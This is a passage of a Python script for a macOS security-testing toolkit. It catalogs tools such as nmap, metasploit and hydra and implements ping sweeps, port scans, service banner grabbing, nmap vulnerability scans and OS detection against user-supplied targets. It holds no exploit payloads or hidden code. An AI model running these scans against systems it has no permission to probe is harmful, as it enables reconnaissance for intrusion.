#!/usr/bin/env python3

import os
import sys
import time
import json
import signal
import shutil
import ipaddress
import subprocess
import atexit
import platform
import datetime
import socket
import random
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import List, Optional, Any, Tuple, Dict, Union

if platform.system() != "Darwin":
    print("This toolkit is designed for macOS. Exiting.")
    sys.exit(1)


def install_dependencies():
    required_packages = ["rich", "pyfiglet", "prompt_toolkit", "requests", "scapy"]
    user = os.environ.get("SUDO_USER", os.environ.get("USER"))
    try:
        if os.geteuid() != 0:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user"] + required_packages)
        else:
            subprocess.check_call(
                ["sudo", "-u", user, sys.executable, "-m", "pip", "install", "--user"] + required_packages)
    except subprocess.CalledProcessError as e:
        print(f"Failed to install dependencies: {e}")
        sys.exit(1)


try:
    import requests
    import pyfiglet
    from rich.console import Console
    from rich.text import Text
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn,
        TimeElapsedColumn, TimeRemainingColumn, MofNCompleteColumn
    )
    from rich.live import Live
    from rich.align import Align
    from rich.style import Style
    from rich.markdown import Markdown
    from rich.traceback import install as install_rich_traceback
    from rich.box import ROUNDED
    from rich.syntax import Syntax

    from prompt_toolkit import prompt as pt_prompt
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.completion import WordCompleter
    from prompt_toolkit.styles import Style as PtStyle

    try:
        import scapy.all as scapy
    except ImportError:
        scapy = None
except ImportError:
    install_dependencies()
    os.execv(sys.executable, [sys.executable] + sys.argv)

install_rich_traceback(show_locals=True)
console = Console()

VERSION = "1.2.0"
APP_NAME = "macOS Ethical Hacking Toolkit"
APP_SUBTITLE = "Security Testing & Reconnaissance Suite"
HOSTNAME = socket.gethostname()

BASE_DIR = Path.home() / ".toolkit"
RESULTS_DIR = BASE_DIR / "results"
PAYLOADS_DIR = BASE_DIR / "payloads"
CONFIG_DIR = BASE_DIR / "config"
WORDLISTS_DIR = BASE_DIR / "wordlists"
HISTORY_DIR = BASE_DIR / ".toolkit_history"
DEFAULT_THREADS = 15
DEFAULT_TIMEOUT = 30

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0"
]

for d in [BASE_DIR, RESULTS_DIR, PAYLOADS_DIR, CONFIG_DIR, WORDLISTS_DIR, HISTORY_DIR]:
    d.mkdir(parents=True, exist_ok=True)

COMMAND_HISTORY = os.path.join(HISTORY_DIR, "command_history")
TARGET_HISTORY = os.path.join(HISTORY_DIR, "target_history")
for history_file in [COMMAND_HISTORY, TARGET_HISTORY]:
    if not os.path.exists(history_file):
        with open(history_file, "w") as f:
            pass


class ToolCategory(str, Enum):
    NETWORK = "network"
    WEB = "web"
    FORENSICS = "forensics"
    CRYPTO = "crypto"
    RECON = "recon"
    EXPLOITATION = "exploitation"
    UTILITIES = "utilities"
    PASSWORD = "password"
    MOBILE = "mobile"
    REVERSE = "reverse"


class InstallMethod(str, Enum):
    BREW = "brew"
    BREW_CASK = "brew_cask"
    CUSTOM = "custom"
    PIP = "pip"
    GIT = "git"


@dataclass
class Tool:
    name: str
    category: ToolCategory
    description: str
    install_methods: List[Tuple[InstallMethod, str]]
    homepage: str
    post_install: List[str] = field(default_factory=list)
    is_core: bool = False


class NordColors:
    POLAR_NIGHT_1 = "#2E3440"
    POLAR_NIGHT_2 = "#3B4252"
    POLAR_NIGHT_3 = "#434C5E"
    POLAR_NIGHT_4 = "#4C566A"
    SNOW_STORM_1 = "#D8DEE9"
    SNOW_STORM_2 = "#E5E9F0"
    SNOW_STORM_3 = "#ECEFF4"
    FROST_1 = "#8FBCBB"
    FROST_2 = "#88C0D0"
    FROST_3 = "#81A1C1"
    FROST_4 = "#5E81AC"
    RED = "#BF616A"
    ORANGE = "#D08770"
    YELLOW = "#EBCB8B"
    GREEN = "#A3BE8C"
    PURPLE = "#B48EAD"

    SUCCESS = Style(color=GREEN, bold=True)
    ERROR = Style(color=RED, bold=True)
    WARNING = Style(color=YELLOW, bold=True)
    INFO = Style(color=FROST_2, bold=True)
    HEADER = Style(color=FROST_1, bold=True)
    SUBHEADER = Style(color=FROST_3, bold=True)
    ACCENT = Style(color=FROST_4, bold=True)
    NORD_BOX = ROUNDED

    @classmethod
    def get_frost_gradient(cls, steps=4):
        return [cls.FROST_1, cls.FROST_2, cls.FROST_3, cls.FROST_4][:steps]

    @classmethod
    def get_polar_gradient(cls, steps=4):
        return [cls.POLAR_NIGHT_1, cls.POLAR_NIGHT_2, cls.POLAR_NIGHT_3, cls.POLAR_NIGHT_4][:steps]

    @classmethod
    def get_progress_columns(cls):
        return [
            SpinnerColumn(spinner_name="dots", style=f"bold {cls.FROST_1}"),
            TextColumn(f"[bold {cls.FROST_2}]{{task.description}}[/]"),
            BarColumn(bar_width=None, style=cls.POLAR_NIGHT_3, complete_style=cls.FROST_2, finished_style=cls.GREEN),
            TaskProgressColumn(style=cls.SNOW_STORM_1),
            MofNCompleteColumn(),
            TimeRemainingColumn(compact=True),
        ]


SECURITY_TOOLS = [
    Tool(
        name="nmap",
        category=ToolCategory.NETWORK,
        description="Network mapper and port scanner",
        install_methods=[
            (InstallMethod.BREW, "nmap"),
        ],
        homepage="https://nmap.org",
        is_core=True
    ),
    Tool(
        name="wireshark",
        category=ToolCategory.NETWORK,
        description="Network protocol analyzer",
        install_methods=[
            (InstallMethod.CUSTOM, "brew install --cask wireshark"),
            (InstallMethod.BREW_CASK, "wireshark"),
        ],
        post_install=[
            "echo 'Wireshark installed. You may need to run it from Applications folder.'",
        ],
        homepage="https://www.wireshark.org"
    ),
    Tool(
        name="masscan",
        category=ToolCategory.NETWORK,
        description="TCP port scanner, faster than nmap",
        install_methods=[
            (InstallMethod.BREW, "masscan"),
        ],
        homepage="https://github.com/robertdavidgraham/masscan"
    ),
    Tool(
        name="tcpdump",
        category=ToolCategory.NETWORK,
        description="Command-line packet analyzer",
        install_methods=[
            (InstallMethod.BREW, "tcpdump"),
        ],
        homepage="https://www.tcpdump.org/"
    ),
    Tool(
        name="mitmproxy",
        category=ToolCategory.WEB,
        description="Interactive HTTPS proxy",
        install_methods=[
            (InstallMethod.BREW, "mitmproxy"),
            (InstallMethod.PIP, "mitmproxy"),
        ],
        homepage="https://mitmproxy.org/"
    ),
    Tool(
        name="burpsuite",
        category=ToolCategory.WEB,
        description="Web vulnerability scanner and proxy",
        install_methods=[
            (InstallMethod.BREW_CASK, "burp-suite"),
        ],
        homepage="https://portswigger.net/burp"
    ),
    Tool(
        name="sqlmap",
        category=ToolCategory.WEB,
        description="Automatic SQL injection tool",
        install_methods=[
            (InstallMethod.BREW, "sqlmap"),
            (InstallMethod.PIP, "sqlmap"),
        ],
        homepage="https://sqlmap.org/"
    ),
    Tool(
        name="nikto",
        category=ToolCategory.WEB,
        description="Web server scanner",
        install_methods=[
            (InstallMethod.BREW, "nikto"),
        ],
        homepage="https://cirt.net/Nikto2"
    ),
    Tool(
        name="ffuf",
        category=ToolCategory.WEB,
        description="Fast web fuzzer",
        install_methods=[
            (InstallMethod.BREW, "ffuf"),
        ],
        homepage="https://github.com/ffuf/ffuf"
    ),
    Tool(
        name="gobuster",
        category=ToolCategory.WEB,
        description="Directory/file & DNS busting tool",
        install_methods=[
            (InstallMethod.BREW, "gobuster"),
        ],
        homepage="https://github.com/OJ/gobuster"
    ),
    Tool(
        name="binwalk",
        category=ToolCategory.FORENSICS,
        description="Firmware analysis tool",
        install_methods=[
            (InstallMethod.BREW, "binwalk"),
            (InstallMethod.PIP, "binwalk"),
        ],
        homepage="https://github.com/ReFirmLabs/binwalk"
    ),
    Tool(
        name="hashcat",
        category=ToolCategory.CRYPTO,
        description="Advanced password recovery utility",
        install_methods=[
            (InstallMethod.BREW, "hashcat"),
        ],
        homepage="https://hashcat.net/"
    ),
    Tool(
        name="john",
        category=ToolCategory.CRYPTO,
        description="John the Ripper password cracker",
        install_methods=[
            (InstallMethod.BREW, "john-jumbo"),
        ],
        homepage="https://www.openwall.com/john/"
    ),
    Tool(
        name="amass",
        category=ToolCategory.RECON,
        description="In-depth Attack Surface Mapping and Asset Discovery",
        install_methods=[
            (InstallMethod.BREW, "amass"),
        ],
        homepage="https://github.com/OWASP/Amass"
    ),
    Tool(
        name="subfinder",
        category=ToolCategory.RECON,
        description="Subdomain discovery tool",
        install_methods=[
            (InstallMethod.BREW, "subfinder"),
        ],
        homepage="https://github.com/projectdiscovery/subfinder"
    ),
    Tool(
        name="theharvester",
        category=ToolCategory.RECON,
        description="E-mail, subdomain and name harvester",
        install_methods=[
            (InstallMethod.BREW, "theharvester"),
            (InstallMethod.PIP, "theharvester"),
        ],
        homepage="https://github.com/laramies/theHarvester"
    ),
    Tool(
        name="metasploit",
        category=ToolCategory.EXPLOITATION,
        description="Penetration testing framework",
        install_methods=[
            (InstallMethod.BREW, "metasploit"),
        ],
        homepage="https://www.metasploit.com/"
    ),
    Tool(
        name="hydra",
        category=ToolCategory.EXPLOITATION,
        description="Login brute-force tool",
        install_methods=[
            (InstallMethod.BREW, "hydra"),
        ],
        homepage="https://github.com/vanhauser-thc/thc-hydra"
    ),
    Tool(
        name="radare2",
        category=ToolCategory.REVERSE,
        description="Reverse engineering framework",
        install_methods=[
            (InstallMethod.BREW, "radare2"),
        ],
        homepage="https://rada.re/r/"
    )
]


@dataclass
class ScanResult:
    target: str
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)
    port_data: Dict[int, Dict[str, str]] = field(default_factory=dict)
    os_info: Optional[str] = None
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)


@dataclass
class OSINTResult:
    target: str
    source_type: str
    data: Dict[str, Any]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class Payload:
    name: str
    payload_type: str
    target_platform: str
    content: str
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


def create_header() -> Panel:
    term_width = shutil.get_terminal_size().columns
    adjusted_width = min(term_width - 4, 80)

    fonts = ["slant", "small_slant", "standard", "big", "digital", "small"]
    ascii_art = ""

    for font in fonts:
        try:
            fig = pyfiglet.Figlet(font=font, width=adjusted_width)
            ascii_art = fig.renderText(APP_NAME)
            if ascii_art.strip():
                break
        except Exception:
            continue

    ascii_lines = [line for line in ascii_art.splitlines() if line.strip()]
    frost_colors = NordColors.get_frost_gradient(min(len(ascii_lines), 4))

    styled_text = ""
    for i, line in enumerate(ascii_lines):
        color = frost_colors[i % len(frost_colors)]
        escaped_line = line.replace("[", "\\[").replace("]", "\\]")
        styled_text += f"[bold {color}]{escaped_line}[/]\n"

    border_style = NordColors.FROST_3
    border_char = "═"
    border_line = f"[{border_style}]{border_char * (adjusted_width - 8)}[/]"

    styled_text = border_line + "\n" + styled_text + border_line

    return Panel(
        Text.from_markup(styled_text),
        border_style=NordColors.FROST_1,
        box=NordColors.NORD_BOX,
        padding=(1, 2),
        title=f"[bold {NordColors.SNOW_STORM_3}]v{VERSION}[/]",
        title_align="right",
        subtitle=f"[bold {NordColors.SNOW_STORM_1}]{APP_SUBTITLE}[/]",
        subtitle_align="center",
    )


def print_message(text: str, style=NordColors.INFO, prefix="•"):
    if isinstance(style, str):
        console.print(f"[{style}]{prefix} {text}[/{style}]")
    else:
        console.print(f"{prefix} {text}", style=style)


def print_success(message: str):
    print_message(message, NordColors.SUCCESS, "✓")


def print_warning(message: str):
    print_message(message, NordColors.WARNING, "⚠")


def print_error(message: str):
    print_message(message, NordColors.ERROR, "✗")


def print_info(message: str):
    print_message(message, NordColors.INFO, "ℹ")


def display_panel(title: str, message: str, style=NordColors.INFO):
    if isinstance(style, str):
        panel = Panel(
            Text.from_markup(message),
            title=title,
            border_style=style,
            box=NordColors.NORD_BOX,
            padding=(1, 2)
        )
    else:
        panel = Panel(
            Text(message),
            title=title,
            border_style=style,
            box=NordColors.NORD_BOX,
            padding=(1, 2)
        )
    console.print(panel)


def get_user_input(prompt_text: str, history=None, password: bool = False, completer=None) -> str:
    try:
        return pt_prompt(
            f"[bold {NordColors.FROST_2}]{prompt_text}:[/] ",
            is_password=password,
            history=FileHistory(history or COMMAND_HISTORY) if not password else None,
            auto_suggest=AutoSuggestFromHistory() if not password else None,
            completer=completer,
            style=PtStyle.from_dict({"prompt": f"bold {NordColors.FROST_2}"}),
        )
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Input cancelled by user[/]")
        return ""


def get_confirmation(prompt_text: str) -> bool:
    try:
        return Confirm.ask(f"[bold {NordColors.FROST_2}]{prompt_text}[/]")
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Confirmation cancelled by user[/]")
        return False


def get_integer_input(prompt_text: str, min_value: int = None, max_value: int = None) -> int:
    try:
        while True:
            value_str = Prompt.ask(f"[bold {NordColors.FROST_2}]{prompt_text}[/]")
            try:
                value = int(value_str)
                if min_value is not None and value < min_value:
                    print_error(f"Value must be at least {min_value}")
                    continue
                if max_value is not None and value > max_value:
                    print_error(f"Value must be at most {max_value}")
                    continue
                return value
            except ValueError:
                print_error("Please enter a valid integer")
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Input cancelled by user[/]")
        return -1


def create_menu_table(title, options):
    table = Table(
        show_header=True,
        header_style=NordColors.HEADER,
        box=ROUNDED,
        title=title,
        border_style=NordColors.FROST_3,
        padding=(0, 1),
        expand=True,
    )

    table.add_column("#", style=NordColors.ACCENT, width=3, justify="right")
    table.add_column("Option", style=NordColors.FROST_1)
    table.add_column("Description", style=NordColors.SNOW_STORM_1)

    for opt in options:
        table.add_row(*opt)

    return table


def display_progress(total: int, description: str, color: str = NordColors.FROST_2) -> Tuple[Progress, int]:
    progress = Progress(
        SpinnerColumn(spinner_name="dots", style=f"bold {color}"),
        TextColumn(f"[bold {color}]{{task.description}}"),
        BarColumn(bar_width=40, style=NordColors.FROST_4, complete_style=color),
        TaskProgressColumn(style=NordColors.SNOW_STORM_1),
        TimeRemainingColumn(),
        console=console,
    )
    progress.start()
    task = progress.add_task(description, total=total)
    return progress, task


def save_result_to_file(result: Any, filename: str) -> bool:
    try:
        filepath = RESULTS_DIR / filename
        if isinstance(result, ScanResult):
            result_dict = {
                "target": result.target,
                "timestamp": result.timestamp.isoformat(),
                "port_data": result.port_data,
                "os_info": result.os_info,
                "vulnerabilities": result.vulnerabilities
            }
        elif isinstance(result, OSINTResult):
            result_dict = {
                "target": result.target,
                "source_type": result.source_type,
                "data": result.data,
                "timestamp": result.timestamp.isoformat(),
            }
        elif isinstance(result, Payload):
            result_dict = {
                "name": result.name,
                "payload_type": result.payload_type,
                "target_platform": result.target_platform,
                "content": result.content,
                "timestamp": result.timestamp.isoformat(),
            }
        else:
            result_dict = result.__dict__ if hasattr(result, '__dict__') else result

        with open(filepath, "w") as f:
            json.dump(result_dict, f, indent=2)
        print_success(f"Results saved to: {filepath}")
        return True
    except Exception as e:
        print_error(f"Failed to save results: {e}")
        return False


def run_command(
        cmd: List[str],
        env=None,
        check=True,
        capture_output=True,
        timeout=DEFAULT_TIMEOUT
) -> subprocess.CompletedProcess:
    cmd_str = " ".join(cmd)
    print_info(f"Executing: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            env=env or os.environ.copy(),
            check=check,
            text=True,
            capture_output=capture_output,
            timeout=timeout,
        )
        return result
    except subprocess.CalledProcessError as e:
        print_error(f"Command failed: {cmd_str}")
        if e.stderr:
            console.print(f"[bold {NordColors.RED}]Error: {e.stderr.strip()}[/]")
        raise
    except subprocess.TimeoutExpired:
        print_error(f"Command timed out after {timeout} seconds: {cmd_str}")
        raise
    except Exception as e:
        print_error(f"Error executing command: {cmd_str} - {e}")
        raise


def get_tool_status(tool_list=None):
    if tool_list is None:
        tool_list = [tool.name for tool in SECURITY_TOOLS]

    installed_tools = {}
    for tool in tool_list:
        installed = shutil.which(tool) is not None
        installed_tools[tool] = installed

    return installed_tools


def network_scanning_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Network Scanning",
        "Discover active hosts, open ports and services.",
        NordColors.FROST_1
    )

    options = [
        ("1", "Ping Sweep", "Discover live hosts on a network"),
        ("2", "Port Scan", "Identify open ports on a target"),
        ("3", "Run Nmap", "Full-featured network scanner"),
        ("4", "Service Fingerprinting", "Identify services running on ports"),
        ("5", "OS Detection", "Attempt to identify operating systems"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Network Scanning Options", options))

    choice = get_integer_input("Select an option", 0, 5)
    if choice == 0:
        return
    elif choice == 1:
        ping_sweep()
    elif choice == 2:
        port_scan()
    elif choice == 3:
        run_nmap()
    elif choice == 4:
        service_fingerprinting()
    elif choice == 5:
        os_detection()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def ping_sweep():
    target = get_user_input("Enter target subnet (e.g., 192.168.1.0/24)")
    if not target:
        return

    live_hosts = []
    try:
        network = ipaddress.ip_network(target, strict=False)
        hosts = list(network.hosts())

        if len(hosts) > 1000:
            print_warning(f"Network has {len(hosts)} hosts. Limiting scan to first 1000.")
            hosts = hosts[:1000]

        progress, task = display_progress(len(hosts), "Pinging hosts", NordColors.FROST_1)

        with progress:
            def check_host(ip):
                try:
                    cmd = ["ping", "-c", "1", "-W", "1", str(ip)]
                    result = subprocess.run(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=1,
                        check=False
                    )
                    if result.returncode == 0:
                        live_hosts.append(str(ip))
                except Exception:
                    pass
                finally:
                    progress.update(task, advance=1)

            with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
                executor.map(check_host, hosts)

        if live_hosts:
            display_panel(
                "Scan Complete",
                f"Found {len(live_hosts)} active hosts",
                NordColors.GREEN
            )

            host_table = Table(
                title="Active Hosts",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            host_table.add_column("IP Address", style=f"bold {NordColors.FROST_2}")
            host_table.add_column("Status", style=NordColors.GREEN)

            for ip in sorted(live_hosts, key=lambda x: [int(p) for p in x.split('.')]):
                host_table.add_row(ip, "● ACTIVE")

            console.print(host_table)

            if get_confirmation("Save these results to file?"):
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"pingsweep_{target.replace('/', '_')}_{timestamp}.json"
                save_result_to_file(
                    {"subnet": target, "live_hosts": live_hosts, "timestamp": datetime.datetime.now().isoformat()},
                    filename
                )
        else:
            display_panel("Scan Complete", "No active hosts found.", NordColors.RED)
    except Exception as e:
        print_error(f"Ping scan error: {e}")


def port_scan():
    target = get_user_input("Enter target IP or hostname")
    if not target:
        return

    scan_type = get_integer_input(
        "Select scan type: 1) TCP Connect, 2) TCP SYN (requires root), 3) Fast TCP SYN with Scapy", 1, 3
    )
    if scan_type < 1:
        return

    port_range = get_user_input("Enter port range (e.g., 1-1000) or leave blank for common ports")
    open_ports = {}

    if port_range:
        try:
            start, end = map(int, port_range.split("-"))
            ports = range(start, end + 1)
        except ValueError:
            print_error("Invalid port range. Using common ports.")
            ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443, 9000, 9090]
    else:
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443, 9000, 9090]

    progress, task = display_progress(len(ports), "Scanning ports", NordColors.FROST_1)

    with progress:
        if scan_type == 1:  # TCP Connect
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    if s.connect_ex((target, port)) == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        open_ports[port] = {"service": service, "state": "open"}
                    s.close()
                except Exception:
                    pass
                finally:
                    progress.update(task, advance=1)

        elif scan_type == 2:  # TCP SYN (using nmap)
            if os.geteuid() != 0:
                print_error("TCP SYN scan requires root privileges")
                return

            try:
                port_list = ",".join(map(str, ports))
                cmd = ["nmap", "-sS", "-T4", "-p", port_list, target]
                result = run_command(cmd, capture_output=True, check=False)

                for line in result.stdout.splitlines():
                    match = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
                    if match:
                        port = int(match.group(1))
                        service = match.group(2)
                        open_ports[port] = {"service": service, "state": "open"}
            except Exception as e:
                print_error(f"Nmap SYN scan error: {e}")
            finally:
                progress.update(task, advance=len(ports))  # Complete the progress bar

        elif scan_type == 3:  # Fast TCP SYN with Scapy
            if scapy is None:
                print_error("Scapy is not installed. Using TCP Connect scan instead.")
                scan_type = 1
                return port_scan()

            if os.geteuid() != 0:
                print_error("Scapy SYN scan requires root privileges")
                return

            try:
                for port in ports:
                    try:
                        ans = scapy.sr1(
                            scapy.IP(dst=target) / scapy.TCP(dport=port, flags="S"),
                            timeout=0.5,
                            verbose=0
                        )
                        if ans and ans.haslayer(scapy.TCP) and ans.getlayer(scapy.TCP).flags == 0x12:  # SYN-ACK
                            try:
                                service = socket.getservbyport(port)
                            except:
                                service = "unknown"
                            open_ports[port] = {"service": service, "state": "open"}
                    except Exception:
                        pass
                    finally:
                        progress.update(task, advance=1)
            except Exception as e:
                print_error(f"Scapy scan error: {e}")

    if open_ports:
        display_panel(
            "Scan Complete",
            f"Found {len(open_ports)} open ports on {target}",
            NordColors.GREEN
        )

        port_table = Table(
            title="Open Ports",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        port_table.add_column("Port", style=f"bold {NordColors.FROST_2}")
        port_table.add_column("Service", style=NordColors.SNOW_STORM_1)
        port_table.add_column("State", style=NordColors.GREEN)

        for port, info in sorted(open_ports.items()):
            port_table.add_row(
                str(port), info.get("service", "unknown"), info.get("state", "unknown")
            )

        console.print(port_table)

        if get_confirmation("Save these results to file?"):
            scan_result = ScanResult(target=target, port_data=open_ports)
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"portscan_{target.replace('.', '_')}_{timestamp}.json"
            save_result_to_file(scan_result, filename)

        if get_confirmation("Would you like to fingerprint services on these ports?"):
            service_fingerprinting(target, list(open_ports.keys()))
    else:
        display_panel("Scan Complete", f"No open ports found on {target}", NordColors.YELLOW)


def run_nmap():
    if shutil.which("nmap") is None:
        display_panel(
            "Tool Missing",
            "Nmap is not installed. Please install it using:\nbrew install nmap",
            NordColors.RED
        )
        return

    target = get_user_input("Enter target IP or hostname")
    if not target:
        return

    scan_type = get_integer_input(
        "Select scan type: 1) Fast scan, 2) Comprehensive scan, 3) OS detection, 4) Vulnerability scan, 5) Custom", 1, 5
    )

    if scan_type == 1:
        options = "-F -T4"
    elif scan_type == 2:
        options = "-sS -sV -p- -T4"
    elif scan_type == 3:
        options = "-O -sV -T4"
    elif scan_type == 4:
        options = "-sV --script=vuln -T4"
    elif scan_type == 5:
        options = get_user_input("Enter nmap options (e.g., -sS -sV -O)")
    else:
        options = "-sS -sV"

    if scan_type in [3, 4] and os.geteuid() != 0:
        print_warning("This scan type works best with root privileges")
        if get_confirmation("Run with sudo?"):
            cmd = ["sudo", "nmap"] + options.split() + [target]
        else:
            cmd = ["nmap"] + options.split() + [target]
    else:
        cmd = ["nmap"] + options.split() + [target]

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Running nmap scan...[/]"):
            result = run_command(cmd, capture_output=True, timeout=600)

        if result.stdout:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"nmap_{target.replace('.', '_')}_{timestamp}.txt"
            output_path = RESULTS_DIR / filename

            with open(output_path, "w") as f:
                f.write(result.stdout)

            console.print(Syntax(result.stdout, "bash", theme="nord"))
            print_success(f"Results saved to: {output_path}")
        else:
            display_panel("Scan Complete", "No output from nmap scan", NordColors.YELLOW)
    except Exception as e:
        print_error(f"Nmap scan error: {e}")


def service_fingerprinting(target=None, ports=None):
    if not target:
        target = get_user_input("Enter target IP or hostname")
        if not target:
            return

    if not ports:
        port_input = get_user_input("Enter ports to scan (comma separated, e.g. 80,443,8080)")
        if not port_input:
            print_error("No ports specified")
            return
        try:
            ports = [int(p.strip()) for p in port_input.split(",")]
        except ValueError:
            print_error("Invalid port specification")
            return

    if shutil.which("nmap") is None:
        print_warning("Nmap not found, using basic service detection")
        fingerprint_basic(target, ports)
    else:
        fingerprint_nmap(target, ports)


def fingerprint_basic(target, ports):
    results = {}
    progress, task = display_progress(len(ports), "Fingerprinting services", NordColors.FROST_2)

    with progress:
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                if s.connect_ex((target, port)) == 0:
                    # Send a generic request to elicit a banner
                    s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = s.recv(1024)
                    if banner:
                        banner = banner.decode('utf-8', errors='ignore').strip()
                        results[port] = {"banner": banner}
                    else:
                        # Try to guess service by port
                        try:
                            service = socket.getservbyport(port)
                            results[port] = {"service": service}
                        except:
                            results[port] = {"service": "unknown"}
                s.close()
            except Exception:
                pass
            finally:
                progress.update(task, advance=1)

    if results:
        display_panel(
            "Service Fingerprinting Results",
            f"Identified {len(results)} services on {target}",
            NordColors.GREEN
        )

        table = Table(
            title="Service Details",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Port", style=f"bold {NordColors.FROST_2}")
        table.add_column("Service", style=NordColors.SNOW_STORM_1)
        table.add_column("Banner/Details", style=NordColors.FROST_3)

        for port, info in sorted(results.items()):
            table.add_row(
                str(port),
                info.get("service", "unknown"),
                info.get("banner", "No banner")[:50] + ("..." if len(info.get("banner", "")) > 50 else "")
            )

        console.print(table)
    else:
        display_panel("Fingerprinting Complete", "Could not identify any services", NordColors.YELLOW)


def fingerprint_nmap(target, ports):
    port_str = ",".join(map(str, ports))
    cmd = ["nmap", "-sV", "-p", port_str, target]

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Fingerprinting services with Nmap...[/]"):
            result = run_command(cmd, capture_output=True, timeout=300)

        if result.stdout:
            # Parse nmap output
            services = {}
            for line in result.stdout.splitlines():
                match = re.search(r'^(\d+)/tcp\s+open\s+(\S+)\s+(.*)', line)
                if match:
                    port = int(match.group(1))
                    service = match.group(2)
                    details = match.group(3).strip()
                    services[port] = {"service": service, "details": details}

            if services:
                display_panel(
                    "Service Fingerprinting Results",
                    f"Identified {len(services)} services on {target}",
                    NordColors.GREEN
                )

                table = Table(
                    title="Service Details",
                    show_header=True,
                    header_style=f"bold {NordColors.FROST_1}",
                )
                table.add_column("Port", style=f"bold {NordColors.FROST_2}")
                table.add_column("Service", style=NordColors.SNOW_STORM_1)
                table.add_column("Version Details", style=NordColors.FROST_3)

                for port, info in sorted(services.items()):
                    table.add_row(
                        str(port),
                        info.get("service", "unknown"),
                        info.get("details", "Unknown")
                    )

                console.print(table)

                if get_confirmation("Save these results to file?"):
                    scan_result = ScanResult(
                        target=target,
                        port_data={port: info for port, info in services.items()}
                    )
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"services_{target.replace('.', '_')}_{timestamp}.json"
                    save_result_to_file(scan_result, filename)
            else:
                display_panel("Fingerprinting Complete", "Could not identify any services", NordColors.YELLOW)
        else:
            display_panel("Fingerprinting Complete", "No output from nmap scan", NordColors.YELLOW)
    except Exception as e:
        print_error(f"Service fingerprinting error: {e}")


def os_detection():
    target = get_user_input("Enter target IP or hostname")
    if not target:
        return

    if os.geteuid() != 0:
        print_warning("OS detection works best with root privileges")
        if not get_confirmation("Continue without root?"):
            return

    method = get_integer_input("Select detection method: 1) Nmap OS Detection, 2) TCP/IP Stack Fingerprinting", 1, 2)

    if method == 1:
        if shutil.which("nmap") is None:
            display_panel(
                "Tool Missing",
                "Nmap is not installed. Please install it using:\nbrew install nmap",
                NordColors.RED
            )
            return

        cmd = ["nmap", "-O", "--osscan-guess", target]
        if os.geteuid() != 0:
            print_warning("Running without root privileges - results may be limited")

        try:
            with console.status(f"[bold {NordColors.FROST_2}]Detecting OS with Nmap...[/]"):
                result = run_command(cmd, capture_output=True, timeout=300)

            os_info = "Unknown"
            accuracy = 0

            if result.stdout:
                for line in result.stdout.splitlines():
                    if "OS details:" in line:
                        os_info = line.split("OS details:")[1].strip()
                    elif "OS CPE:" in line:
                        os_cpe = line.split("OS CPE:")[1].strip()
                        if os_cpe:
                            os_info += f" (CPE: {os_cpe})"
                    elif "Aggressive OS guesses:" in line:
                        os_guesses = line.split("Aggressive OS guesses:")[1].strip()
                        if os_guesses:
                            os_info = os_guesses
                    elif "OS detection performed" in line and "accuracy" in line:
                        accuracy_match = re.search(r'accuracy: (\d+)', line)
                        if accuracy_match:
                            accuracy = int(accuracy_match.group(1))

            display_panel(
                "OS Detection Results",
                f"Target: {target}\nOS: {os_info}\nAccuracy: {accuracy}%",
                NordColors.GREEN if accuracy > 80 else NordColors.YELLOW
            )

            if get_confirmation("Save these results to file?"):
                scan_result = ScanResult(
                    target=target,
                    os_info={"os": os_info, "accuracy": accuracy}
                )
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"os_detection_{target.replace('.', '_')}_{timestamp}.json"
                save_result_to_file(scan_result, filename)

        except Exception as e:
